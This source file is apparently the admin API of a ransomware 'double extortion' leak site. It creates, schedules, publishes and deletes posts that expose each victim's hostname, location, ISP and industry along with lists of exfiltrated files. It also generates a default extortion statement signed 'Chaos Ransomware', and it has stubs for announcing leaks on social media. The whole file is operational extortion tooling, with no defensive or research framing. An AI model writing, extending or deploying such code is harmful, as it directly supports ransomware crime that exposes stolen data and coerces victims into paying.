// vercel-dashboard/api/leak/site.js
// Double extortion leak site / blog

import { kv } from '../../lib/kv.js';
import { verifyPayloadApiKey } from '../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'admin') {
    return response.status(403).json({ error: 'Admin access required' });
  }

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response);
      case 'POST':
        return await handlePost(request, response);
      case 'PUT':
        return await handlePut(request, response);
      case 'DELETE':
        return await handleDelete(request, response);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Leak site error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

async function handleGet(request, response) {
  const { id, page = 1, limit = 20, status } = request.query;

  if (id) {
    // Single post
    const post = await kv.get(`leak:${id}`);
    if (!post) return response.status(404).json({ error: 'Post not found' });
    return response.json(post);
  }

  // List posts
  const postIds = await kv.smembers('global:leak_posts') || [];
  const posts = [];

  for (const pid of postIds) {
    const post = await kv.get(`leak:${pid}`);
    if (post && (!status || post.status === status)) {
      posts.push(post);
    }
  }

  posts.sort((a, b) => new Date(b.publishedAt || b.createdAt) - new Date(a.publishedAt || a.createdAt));

  const pageNum = parseInt(page);
  const limitNum = parseInt(limit);
  const start = (pageNum - 1) * limitNum;

  return response.json({
    posts: posts.slice(start, start + limitNum),
    total: posts.length,
    page: pageNum,
    pageSize: limitNum,
  });
}

async function handlePost(request, response) {
  const { victimId, campaignId, title, content, filesToPublish, scheduledAt } = request.body;

  if (!victimId || !campaignId) {
    return response.status(400).json({ error: 'victimId and campaignId required' });
  }

  const victim = await kv.get(`victim:${victimId}`);
  if (!victim) {
    return response.status(404).json({ error: 'Victim not found' });
  }

  const campaign = await kv.get(`campaign:${campaignId}`);
  if (!campaign) {
    return response.status(404).json({ error: 'Campaign not found' });
  }

  // Get files to publish
  const fileIds = filesToPublish || await kv.smembers(`victim:${victimId}:leak_files`) || [];
  const files = [];
  let totalSize = 0;

  for (const fid of fileIds) {
    const meta = await kv.get(`file:${fid}:meta`);
    if (meta) {
      files.push(meta);
      totalSize += meta.size;
    }
  }

  const postId = `leak_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const now = new Date().toISOString();

  const post = {
    id: postId,
    victimId,
    campaignId,
    victimName: victim.hostname || victimId,
    victimCountry: victim.country,
    victimCity: victim.city,
    victimIndustry: victim.industry || 'Unknown',
    title: title || `Data Leak: ${victim.hostname || victimId}`,
    content: content || generateDefaultLeakContent(victim, campaign, files),
    files,
    totalFiles: files.length,
    totalSize,
    status: scheduledAt ? 'scheduled' : 'draft',
    createdAt: now,
    updatedAt: now,
    publishedAt: scheduledAt || null,
    scheduledAt: scheduledAt || null,
    views: 0,
    downloads: 0,
    tags: ['ransomware', 'data-leak', victim.country.toLowerCase()],
  };

  await kv.set(`leak:${postId}`, post);
  await kv.sadd('global:leak_posts', postId);
  await kv.sadd(`campaign:${campaignId}:leak_posts`, postId);
  await kv.sadd(`victim:${victimId}:leak_posts`, postId);

  // If scheduled, set up cron (in production, use Vercel Cron or external scheduler)
  if (scheduledAt) {
    await scheduleLeakPost(postId, scheduledAt);
  }

  return response.status(201).json(post);
}

async function handlePut(request, response) {
  const { id, ...updates } = request.body;
  if (!id) return response.status(400).json({ error: 'Post ID required' });

  const existing = await kv.get(`leak:${id}`);
  if (!existing) return response.status(404).json({ error: 'Post not found' });

  const updated = {
    ...existing,
    ...updates,
    id,
    updatedAt: new Date().toISOString(),
  };

  // Handle publish
  if (updates.status === 'published' && existing.status !== 'published') {
    updated.publishedAt = new Date().toISOString();
    await notifyLeakPublished(updated);
  }

  await kv.set(`leak:${id}`, updated);
  return response.json(updated);
}

async function handleDelete(request, response) {
  const { id } = request.query;
  if (!id) return response.status(400).json({ error: 'Post ID required' });

  const existing = await kv.get(`leak:${id}`);
  if (!existing) return response.status(404).json({ error: 'Post not found' });

  await kv.del(`leak:${id}`);
  await kv.srem('global:leak_posts', id);
  await kv.srem(`campaign:${existing.campaignId}:leak_posts`, id);
  await kv.srem(`victim:${existing.victimId}:leak_posts`, id);

  return response.json({ success: true, deleted: id });
}

function generateDefaultLeakContent(victim, campaign, files) {
  const fileList = files.slice(0, 50).map(f => 
    `- ${f.fileName} (${(f.size / 1024).toFixed(1)} KB, ${f.fileExt})`
  ).join('\n');

  return `
# ${victim.hostname || victim.id} - DATA LEAK

**Victim Information:**
- Hostname: ${victim.hostname || 'Unknown'}
- Country: ${victim.country} (${victim.city || 'Unknown'})
- ISP: ${victim.isp || 'Unknown'}
- Industry: ${victim.industry || 'Unknown'}
- Infection Date: ${victim.firstSeen || 'Unknown'}

**Attack Details:**
- Campaign: ${campaign.name}
- Ransomware: Chaos Ransomware
- Encryption: RSA-4096 + AES-256 (Hybrid)
- Files Encrypted: ${victim.filesEncrypted || 'Unknown'}
- Data Exfiltrated: ${victim.filesExfiltrated || files.length} files (${(files.reduce((a, b) => a + b.size, 0) / 1024 / 1024).toFixed(1)} MB)

**Sample Files (${files.length} total):**
${fileList}
${files.length > 50 ? `\n... and ${files.length - 50} more files` : ''}

**Statement:**
This data was exfiltrated prior to encryption. The victim failed to negotiate in good faith.
Full dataset available for download.

---
Published by Chaos Ransomware | ${new Date().toISOString().split('T')[0]}
  `.trim();
}

async function scheduleLeakPost(postId, scheduledAt) {
  // In production: use Vercel Cron Jobs or external scheduler (cron-job.org, etc.)
  // For now, just log
  console.log(`Leak post ${postId} scheduled for ${scheduledAt}`);
}

async function notifyLeakPublished(post) {
  // In production: webhook to Telegram, Discord, Twitter API, etc.
  console.log(`Leak published: ${post.id} - ${post.title}`);
  
  // Auto-tweet if configured
  if (process.env.TWITTER_API_KEY) {
    // await tweetLeak(post);
  }
}